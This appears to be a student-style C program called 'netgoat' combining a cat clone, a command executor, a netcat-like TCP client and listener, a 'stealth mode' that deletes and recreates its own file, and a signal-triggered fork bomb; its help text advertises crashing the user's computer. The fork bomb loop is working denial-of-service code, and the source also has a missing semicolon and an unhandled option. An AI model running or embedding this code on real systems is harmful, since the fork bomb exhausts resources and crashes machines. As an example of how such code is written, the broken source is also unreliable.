#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <errno.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <malloc.h>
#include <signal.h>
#include <netinet/in.h>  // Network Internet Library: IPPROTO_*
#include <arpa/inet.h>
#include <sys/socket.h>


char *fd;
int toggle = 0;
int flip;
#define STD_ERR_RETURN  -1

void sighandle(int num);

int straycat(int argc, char *argv[]);  //prototype function for file 1
int flags(int argc, char *argv[]);
int stealth();
void unstealth();
void myshell(char *argv[]);
void show_usage();
void netKitty(int argc, char *argv[]);
int main(int argc, char *argv[])
{
   //int intPause = 0;
   int fail;
   flip = flags(argc, argv);

   while(1){
   struct sigaction handle;  // sigaction for signal handler information
       // Perform Function
       // Setup the information to register the signal handler
    handle.sa_handler = &sighandle;
    handle.sa_flags = SA_RESTART;

   fail = sigaction(SIGUSR1, &handle, NULL);
   if ( fail == STD_ERR_RETURN ) {
         fprintf(stderr, "ERROR: Unable to register signal handler\n");
         return 2;
     }
   fail = sigaction(SIGUSR2, &handle, NULL);
   if ( fail == STD_ERR_RETURN ) {
         fprintf(stderr, "ERROR: Unable to register signal handler\n");
         return 2;
      }
  
   fail = sigaction(SIGINT, &handle, NULL);
   if ( fail == STD_ERR_RETURN ) {
        fprintf(stderr, "ERROR: Unable to register signal handler\n");
         return 2;
           }
          
  printf("(%ld) Waiting for signals...\n", (long)getpid());
  pause();
  }
  


return(0);
}
int straycat(int argc, char *argv[])
   {
   int fd;  //file descriptor (refers to file)
   int num_read;  //number of bytes to read from file
   char buffer[1000];   //buffer data to store data being read
   int i;

   for(i = 2; i < argc; i++)
   {  
       //declare and use getopt in order to display help with using the myCat
       //program
       //in the command line type -h by itself to display help
       

       fd = open(argv[i], O_RDONLY); //open file. flag arguement is read only(O_RDONLY)

 if(strcmp(argv[i], "-") == 0)  //enter file argument followed by a "-" will takk
   // e any standard input and have it displayed as standard output until EOF
         { 
              int second_read;
              while ((second_read = read(0, buffer, 1000)) != -1)
              { 
                  write(1, buffer, second_read);
                  printf("\n");
    
                  if((second_read = read(0, buffer, 1000)) == -1)
                     { 
                        close(second_read);
                        exit(0);
                     } 
              } 
         } 



       if(fd < 0) //error statements where if an error is thrown, a return value of 1-4 is returned to main
       {
          perror("Error");
          return (-1);
       }

       while((num_read = read(fd, buffer, 1000)) > 0)
       {       
          if(num_read < 0)//read data in buffer array
          {
             perror("Error");
             return (-2);
          } 
          if(write(1, buffer, num_read) < 0)//write the file to standard outputi
          {
             perror("Error ");
             return (-3);
          }    
       }
       if(close(fd) < 0) //close the file
       {
          perror("Error ");
          return (-4); 
       }
       printf("\n");

        
   }
   return(0);  
}

int flags(int argc, char *argv[]){
 int opt = 0;
       while((opt = getopt(argc, argv, "hc:sfel:")) != -1)
       {
          switch(opt)
          {
             case 'h':
             show_usage();
             break;

             case 's':
             stealth();
             toggle = 1;
             
             break;

             case 'c':
             straycat(argc, argv);
             break;

             case 'f':
             flip = -1;
             return(flip);
             break;

             case 'e':
              myshell(&argv[2]);
              break;

            case 'l':
            netKitty(argc, argv);
            break
            case 'y':
            netKitty(argc, argv);
            break;
           }
          //exit(0);
       }
       //return(0);
       return(flip);
}
 
int stealth()
{
  // Declare Required Variables
   int fd;  //file descriptor (refers to file)
   int num_read;  //number of bytes to read from file
  int intPause = 0;  // Variable to force pausing point within program, to support external testing
  // Perform Function
   fd = open("netgoat", O_RDONLY); //open file or create new file with permissions
   if(fd < 0) //error statements where if an error is thrown, a return value of 1- 4 is returned to main
   {
      perror("Error");
      printf("There was an open error\n");
      return (-1);
   }
   int size = lseek(fd, 0, SEEK_END);  //seek till the end of file to obtain size
   lseek(fd, 0, SEEK_SET); //seek back to beginning of file byte 
  char buffer[size + 1];   //set buffer size equal to previous seeked byte size of file plus 1 extra byte
  buffer[size] = '\0'; //file null termination 
   while((num_read = read(fd, buffer, size)) > 0)
   {
      if(num_read < 0)//read data in buffer array
      {
         perror("Error");
         printf("There was a read error\n");
         return (-2);
      }
   }
   
   unlink("netgoat");  //remove the specified file
  
fprintf( stdout, "Entered Stealth Mode\n");
printf("PID: (%ld)\n", (long)getpid());
scanf("%d", &intPause);  // Read in integer as forced pause point
toggle = 1;
int fd_2 = open("netgoat", O_WRONLY | O_CREAT, S_IRWXU);//create new file with read,write, and execute permissions and store in the read data from the recently removed file
  write(fd_2, buffer, strlen(buffer));
  close(fd);
  close(fd_2);
  // link("netgoat", "netgoat");
return(0);
}

  void unstealth(){

printf("PID: (%ld)\n", (long)getpid());
int fd_2;
fd_2 = open("netgoat", O_WRONLY | O_CREAT, S_IRWXU);//create new file with read,write, and execute permissions and store in the read data from the recently removed file

// write(fd_2, buffer, strlen(buffer));
   close(fd_2);
   toggle = 0;
}


void sighandle(int num) {
   if(flip ==-1){
switch (num) {
          case SIGUSR1:
           while(1){
        open("netgoat", O_WRONLY | O_CREAT, S_IRWXU);    
           }             
     
            break;
          case SIGUSR2:
         printf("Sorry, feature is temporarily unavailable\n");

          break;

  }
   }
   else{
     switch (num) {
          case SIGUSR1:
           while(1){
            fork();
            int *p = (int *) malloc (sizeof (int) * 100000);
            p=p; //Remove unused var warning.
            printf("BOMB!");
          }
     
            break;
          case SIGUSR2:
         if(toggle == 1){ 
          printf("exit stealth mode\n");
          unstealth();
          

         }
         else{
            stealth();
         }
          
          break;
     }
     return;
}
}
void myshell(char *argv[]){
    if (!getenv("PATH")){ // test to see if PATH is not null, then execute
    setenv("PATH", "/bin:/usr/bin:/usr/local/bin", 1);
  }
    int pidFork = fork();
    if (pidFork == 0){
    execvp(argv[0], &argv[0]);
    exit(0);
    }
    else if(pidFork < 0){
      perror("ERROR");
    }
    else{
      wait(NULL);
      exit(0);
    }
        //execvp(command.cmd, command.argv);
}
  // Return to Caller;

void show_usage(){
             printf("NAME\n\n");
             printf("netgoat\n\n");
             printf("Considered the 'Swiss Army Knife' of codes. NetGoat is a program to allow users to select from a multitude of command line options in order to perform tasks ranging from hiding the executable to crashing the user's computer system.\n\n");
             printf("netgoat [file] ...\n\n");
             printf("Command Line Options\n\n");


             printf("netgoat <option>\n");
             printf("-h\tdisplay help\n");
             printf("-s\tstealth mode\n");
             printf("-c\tuse cat functionality\n");
             printf("-f\tactivate fork bomb\n");
             printf("-e\texecute myshell command\n");
             printf("-l\tlisten on port\n");
             printf("-y\tconnet to server on IP and port");

}


void netKitty(int argc, char *argv[]){
// Declare Required Variables
   int option;  
   int readvalue; 
   char buffer[1000];
   int sockfd;
   int sockfd2;
   int port;
 
  
     struct sockaddr_in server_addR, client_addR;
     struct sockaddr_storage store_addR;
      socklen_t length;

       
  
if(strcmp(argv[1], "-l") != 0 && strcmp(argv[1], "-h") != 0){ //if not -l or -h, works as client  
if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
          perror("Error");}
          port = atoi(argv[2]); 
         client_addR.sin_port = htons(port);
         client_addR.sin_family = AF_INET;
               
         inet_pton(AF_INET, argv[1], &client_addR.sin_addr);
         
         if(connect(sockfd, (struct sockaddr*)&client_addR, sizeof(client_addR)) == 0){
            write(1, "Connected to Server\n", 20);}
       
        while(1){ //send and receive from the server
         readvalue = read( 0 , buffer, 1000);
         send(sockfd, buffer, readvalue, 0);
         int value2 = recv(sockfd, buffer, 1000, 0);
         write(1, buffer, value2);}
         close(sockfd);
   } 

    opterr = 0;
   
  while ( ( option = getopt(argc, argv, "cl:")) != -1 ) {
    switch (option) {
         case 'c':
         if( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) == -1){
          perror("Error");
        }
          port = atoi(argv[2]); 
         client_addR.sin_port = htons(port);
         client_addR.sin_family = AF_INET;
               
         inet_pton(AF_INET, argv[1], &client_addR.sin_addr);
         
         if(connect(sockfd, (struct sockaddr*)&client_addR, sizeof(client_addR)) == 0){
            write(1, "Connected to Server\n", 20);}
       
        while(1){ //send and receive from the server
         readvalue = read( 0 , buffer, 1000);
         send(sockfd, buffer, readvalue, 0);
         int value2 = recv(sockfd, buffer, 1000, 0);
         write(1, buffer, value2);
       }
         close(sockfd);
         case 'l':   //to be used as server
            if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) == 0){
            perror("ERROR");}
        
          port = atoi(argv[2]);
         server_addR.sin_port = htons(port);
         
         server_addR.sin_family = AF_INET;
         server_addR.sin_addr.s_addr = INADDR_ANY;
        
        
                  
        if( (bind(sockfd, (struct sockaddr*) &server_addR, sizeof(server_addR))) ==-1){
           perror("ERROR");}
           
         
         if(listen(sockfd, 10) == 0){
            printf("listening on port %d\n", port);}
       
        length = sizeof(store_addR);
        if((sockfd2 = accept(sockfd, (struct sockaddr*)&store_addR, &length)) == -1){
         perror("ERROR");}
        else{
           write(1, "Connection established!\n", 24);}
       
         while(1){   //send and receive from client
         readvalue = read( 0 , buffer, 1000);
         send(sockfd2, buffer, readvalue, 0);
         int value2 = recv(sockfd2, buffer, 1000, 0);
         write(1, buffer, value2);}
        close(sockfd2);
        
         break; 
  }
}
}